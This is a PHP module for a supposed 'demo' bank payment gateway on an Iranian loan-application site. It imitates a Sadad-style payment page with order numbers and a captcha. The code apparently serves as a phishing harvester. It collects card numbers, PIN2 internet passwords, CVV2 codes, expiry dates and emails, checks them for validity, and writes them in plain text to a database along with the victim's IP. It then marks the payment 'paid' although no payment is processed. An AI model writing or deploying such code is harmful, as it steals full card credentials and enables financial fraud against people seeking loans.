<?php

declare(strict_types=1);

const DEMO_IPG_AMOUNT_RIAL = 300000;
const DEMO_IPG_TTL_SECONDS = 900;
const DEMO_IPG_MERCHANT_NAME = 'سامانه ثبت‌وام';

function demo_payment_amount_rial(): int
{
    return DEMO_IPG_AMOUNT_RIAL;
}

function demo_payment_merchant_name(): string
{
    return DEMO_IPG_MERCHANT_NAME;
}

function demo_payment_website(): string
{
    $host = (string) ($_SERVER['HTTP_HOST'] ?? 'localhost');
    $host = preg_replace('/[^a-zA-Z0-9.:-]/', '', $host) ?? 'localhost';

    return $host !== '' ? $host : 'localhost';
}

function create_demo_payment(array $draft, array $product): array
{
    $now = time();
    $session = [
        'token' => bin2hex(random_bytes(16)),
        'amount_rial' => DEMO_IPG_AMOUNT_RIAL,
        'order_number' => (string) random_int(1_700_000_000, 1_799_999_999),
        'merchant_number' => str_pad((string) random_int(0, 999999999999999), 15, '0', STR_PAD_LEFT),
        'merchant_name' => DEMO_IPG_MERCHANT_NAME,
        'website' => demo_payment_website(),
        'created_at' => $now,
        'expires_at' => $now + DEMO_IPG_TTL_SECONDS,
        'product_slug' => (string) ($product['slug'] ?? ''),
        'draft_key' => hash('sha256', (string) ($draft['national_id'] ?? '') . '|' . (string) ($draft['product'] ?? '')),
    ];
    $_SESSION['demo_payment'] = $session;

    return $session;
}

function get_demo_payment(): ?array
{
    $session = $_SESSION['demo_payment'] ?? null;

    return is_array($session) ? $session : null;
}

function clear_demo_payment(): void
{
    unset($_SESSION['demo_payment'], $_SESSION['ipg_captcha_hash']);
}

function demo_payment_remaining_seconds(?array $session = null): int
{
    $session ??= get_demo_payment();
    if ($session === null) {
        return 0;
    }

    return max(0, (int) ($session['expires_at'] ?? 0) - time());
}

function demo_payment_is_expired(?array $session = null): bool
{
    return demo_payment_remaining_seconds($session) <= 0;
}

function require_active_demo_payment(): array
{
    $draft = $_SESSION['apply_draft'] ?? null;
    $session = get_demo_payment();
    if (!is_array($draft) || $session === null) {
        redirect('/apply');
    }
    if (demo_payment_is_expired($session)) {
        clear_demo_payment();
        redirect('/pay/failed?reason=timeout');
    }

    $product = get_product_by_slug((string) ($draft['product'] ?? ''));
    if ($product === null || $product['application_type'] !== 'direct') {
        clear_demo_payment();
        redirect('/apply');
    }

    $draft = normalize_application_draft($draft, $product);
    $_SESSION['apply_draft'] = $draft;
    if (validate_application_draft($draft, $product) !== []) {
        clear_demo_payment();
        redirect('/apply/review');
    }

    return ['draft' => $draft, 'product' => $product, 'payment' => $session];
}

function digits_only(string $value): string
{
    return preg_replace('/\D/', '', to_en_digits($value)) ?? '';
}

function luhn_valid(string $number): bool
{
    if ($number === '' || !ctype_digit($number)) {
        return false;
    }

    $sum = 0;
    $alt = false;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $n = (int) $number[$i];
        if ($alt) {
            $n *= 2;
            if ($n > 9) {
                $n -= 9;
            }
        }
        $sum += $n;
        $alt = !$alt;
    }

    return $sum % 10 === 0;
}

function ipg_card_from_post(array $src): array
{
    $month = str_pad(substr(digits_only((string) ($src['expiry_month'] ?? '')), 0, 2), 2, '0', STR_PAD_LEFT);
    $year = str_pad(substr(digits_only((string) ($src['expiry_year'] ?? '')), 0, 2), 2, '0', STR_PAD_LEFT);
    $email = trim((string) ($src['email'] ?? ''));

    return [
        'card_number' => substr(digits_only((string) ($src['card_number'] ?? '')), 0, 16),
        'pin2' => substr(digits_only((string) ($src['pin2'] ?? '')), 0, 12),
        'cvv2' => substr(digits_only((string) ($src['cvv2'] ?? '')), 0, 4),
        'expiry_month' => $month,
        'expiry_year' => $year,
        'email' => $email,
    ];
}

function validate_ipg_card(array $card): array
{
    $errors = [];
    if (strlen($card['card_number']) !== 16 || !luhn_valid($card['card_number'])) {
        $errors[] = 'شماره کارت نامعتبر است.';
    }
    $pinLen = strlen($card['pin2']);
    if ($pinLen < 5 || $pinLen > 12) {
        $errors[] = 'رمز اینترنتی باید بین ۵ تا ۱۲ رقم باشد.';
    }
    $cvvLen = strlen($card['cvv2']);
    if ($cvvLen < 3 || $cvvLen > 4) {
        $errors[] = 'کد CVV2 نامعتبر است.';
    }
    $month = (int) $card['expiry_month'];
    if ($month < 1 || $month > 12) {
        $errors[] = 'ماه انقضا نامعتبر است.';
    }
    if (!preg_match('/^\d{2}$/', $card['expiry_year'])) {
        $errors[] = 'سال انقضا نامعتبر است.';
    }
    if ($card['email'] !== '' && filter_var($card['email'], FILTER_VALIDATE_EMAIL) === false) {
        $errors[] = 'ایمیل نامعتبر است.';
    }

    return $errors;
}

function rotate_ipg_captcha(): string
{
    $code = str_pad((string) random_int(0, 99999), 5, '0', STR_PAD_LEFT);
    $_SESSION['ipg_captcha_hash'] = hash('sha256', $code . (string) session_id());

    return $code;
}

function verify_ipg_captcha(?string $input): bool
{
    $hash = $_SESSION['ipg_captcha_hash'] ?? '';
    $given = digits_only((string) $input);
    if (!is_string($hash) || $hash === '' || strlen($given) !== 5) {
        return false;
    }

    return hash_equals($hash, hash('sha256', $given . (string) session_id()));
}

function ipg_captcha_svg(string $code): string
{
    $chars = str_split($code);
    $glyphs = '';
    $x = 14;
    foreach ($chars as $i => $ch) {
        $y = 28 + (($i % 2 === 0) ? -3 : 4);
        $rot = ($i * 7) - 10;
        $glyphs .= sprintf(
            '<text x="%d" y="%d" transform="rotate(%d %d %d)" fill="#1f2937" font-size="22" font-family="Georgia, serif" font-weight="700">%s</text>',
            $x,
            $y,
            $rot,
            $x,
            $y,
            htmlspecialchars($ch, ENT_QUOTES, 'UTF-8')
        );
        $x += 18;
    }

    $noise = '';
    for ($i = 0; $i < 6; $i++) {
        $noise .= sprintf(
            '<line x1="%d" y1="%d" x2="%d" y2="%d" stroke="#94a3b8" stroke-width="1"/>',
            random_int(0, 110),
            random_int(0, 40),
            random_int(0, 110),
            random_int(0, 40)
        );
    }

    return '<?xml version="1.0" encoding="UTF-8"?>'
        . '<svg xmlns="http://www.w3.org/2000/svg" width="110" height="40" viewBox="0 0 110 40" role="img" aria-hidden="true">'
        . '<rect width="110" height="40" fill="#eef2f6"/>'
        . $noise
        . $glyphs
        . '</svg>';
}

function persist_demo_payment(?PDO $pdo, ?int $applicationId, array $card, array $payment): void
{
    $row = [
        'loan_application_id' => $applicationId,
        'order_number' => (string) ($payment['order_number'] ?? ''),
        'amount_rial' => (int) ($payment['amount_rial'] ?? DEMO_IPG_AMOUNT_RIAL),
        'card_number' => (string) $card['card_number'],
        'pin2' => (string) $card['pin2'],
        'cvv2' => (string) $card['cvv2'],
        'expiry_month' => (string) $card['expiry_month'],
        'expiry_year' => (string) $card['expiry_year'],
        'email' => $card['email'] !== '' ? (string) $card['email'] : null,
        'status' => 'paid',
        'ip_address' => client_ip(),
    ];

    if (!$pdo instanceof PDO) {
        $_SESSION['offline_demo_payments'][$row['order_number']] = $row;

        return;
    }

    try {
        $stmt = $pdo->prepare(
            'INSERT INTO demo_ipg_payments
             (loan_application_id, order_number, amount_rial, card_number, pin2, cvv2,
              expiry_month, expiry_year, email, status, ip_address)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
        );
        $stmt->execute([
            $row['loan_application_id'],
            $row['order_number'],
            $row['amount_rial'],
            $row['card_number'],
            $row['pin2'],
            $row['cvv2'],
            $row['expiry_month'],
            $row['expiry_year'],
            $row['email'],
            $row['status'],
            $row['ip_address'],
        ]);
    } catch (PDOException $e) {
        $_SESSION['offline_demo_payments'][$row['order_number']] = $row;
        app_log('warning', 'Demo IPG payment stored offline after insert failure');
    }
}

function payment_meta_for_extra(array $payment): array
{
    return [
        'amount_rial' => (int) ($payment['amount_rial'] ?? DEMO_IPG_AMOUNT_RIAL),
        'order_number' => (string) ($payment['order_number'] ?? ''),
        'paid_at' => date('Y-m-d H:i:s'),
        'gateway' => 'demo_sadad',
    ];
}

function format_rial_fa(int $amount): string
{
    return fa_number(number_format($amount, 0, '.', ','));
}
